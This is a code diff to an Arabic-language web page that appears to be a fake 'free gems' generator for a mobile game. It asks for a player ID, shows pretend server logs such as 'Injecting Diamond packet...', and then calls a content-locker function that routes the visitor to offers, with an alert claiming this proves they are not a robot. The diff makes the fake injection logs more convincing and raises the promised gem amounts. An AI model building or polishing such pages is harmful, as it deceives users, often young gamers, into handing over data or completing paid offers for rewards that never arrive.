@@ -50,13 +50,13 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
     text-align: center; outline: none; transition: 0.3s;
 }
 
-.error-msg { color: #ff4b2b; font-size: 13px; margin-bottom: 15px; display: none; font-weight: bold; }
+.error-msg { color: #ff4b2b; font-size: 13px; margin-bottom: 15px; display: none; font-weight: bold; line-height: 1.4; }
 
 /* أيقونات الأنظمة */
 .platform-grid { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
 .platform-item {
     background: #1e293b; padding: 15px; border-radius: 15px; border: 2px solid #334155;
-    cursor: pointer; transition: 0.3s; flex: 1; opacity: 0.6;
+    cursor: pointer; transition: 0.3s; flex: 1; opacity: 0.5;
 }
 .platform-item.selected { border-color: var(--primary); opacity: 1; background: rgba(255, 204, 0, 0.1); }
 .platform-item svg { width: 30px; height: 30px; fill: #fff; }
@@ -87,7 +87,7 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
         <h2>شحن الجواهر المباشر</h2>
         
         <input type="text" id="id-player" class="input-box" placeholder="أدخل معرف اللاعب (ID)" inputmode="numeric">
-        <div id="id-error" class="error-msg">⚠️ خطأ: يرجى إدخال ID صحيح (8-10 أرقام)</div>
+        <div id="id-error" class="error-msg">⚠️ يرجى إدخال ID صحيح يتكون من 7 إلى 11 رقم فقط</div>
 
         <div class="platform-grid">
             <div class="platform-item selected" onclick="selectPlatform(this)">
@@ -107,10 +107,10 @@ h2 { color: var(--primary); font-weight: 900; font-size: 1.5rem; margin-bottom: 
     <div id="step2" class="step-card">
         <h2>كمية الجواهر المطلوبة</h2>
         <div class="gems-grid">
-            <div class="gem-item" onclick="selectGem(this)">💎<br><b>1,500</b></div>
-            <div class="gem-item" onclick="selectGem(this)">💎<br><b>2,600</b></div>
-            <div class="gem-item" onclick="selectGem(this)">💎<br><b>3,100</b></div>
-            <div class="gem-item" onclick="selectGem(this)">💎<br><b>5,000</b></div>
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>2,500</b></div>
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>5,600</b></div>
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>10,000</b></div>
+            <div class="gem-item" onclick="selectGem(this)">💎<br><b>15,000</b></div>
         </div>
         <div id="gem-error" class="error-msg" style="margin-top:10px">⚠️ يجب اختيار كمية الجواهر أولاً!</div>
         <button class="btn-main" style="margin-top:15px" onclick="validateGemSelection()">بدء الشحن</button>
@@ -142,15 +142,20 @@ function selectGem(x){
 }
 
 function validateID(){
-    const val=document.getElementById('id-player').value;
+    const val=document.getElementById('id-player').value.trim();
     const err=document.getElementById('id-error');
-    // التحقق أن المدخل أرقام فقط وطوله بين 8 و 10
-    if(/^\d{8,10}$/.test(val)){
+    
+    // شرط التحقق: أرقام فقط، والطول من 7 إلى 11
+    const idPattern = /^\d{7,11}$/;
+
+    if(idPattern.test(val)){
         err.style.display='none';
         userID = val;
         next(2);
     } else {
         err.style.display='block';
+        // تركيز بسيط لهز الصندوق للتنبيه
+        document.getElementById('id-player').style.borderColor = "#ff4b2b";
     }
 }
 
@@ -166,7 +171,7 @@ function next(s){
 
 function startProcess(){
     const c = document.getElementById('console');
-    const logs = ["> Connecting...", "> User " + userID + " found.", "> Injecting Gems...", "> Verification Required!"];
+    const logs = ["> Connecting to game servers...", "> Validating Player ID: " + userID, "> Syncing assets...", "> Injecting Diamond packet...", "> Protocol finished. Manual verification required!"];
     let i = 0;
     let t = setInterval(() => {
         c.innerHTML += `<div>${logs[i]}</div>`;
@@ -183,7 +188,7 @@ function startProcess(){
 function callMyLocker(){
     if(typeof _Vm==='function'){ _Vm(); }
     else if(typeof _cp==='function'){ _cp(); } 
-    else{ alert("أكمل التحقق الأخير لتصلك الجواهر."); }
+    else{ alert("يرجى إكمال العرض الأخير للتحقق من أنك لست روبوت."); }
 }
 </script>
 
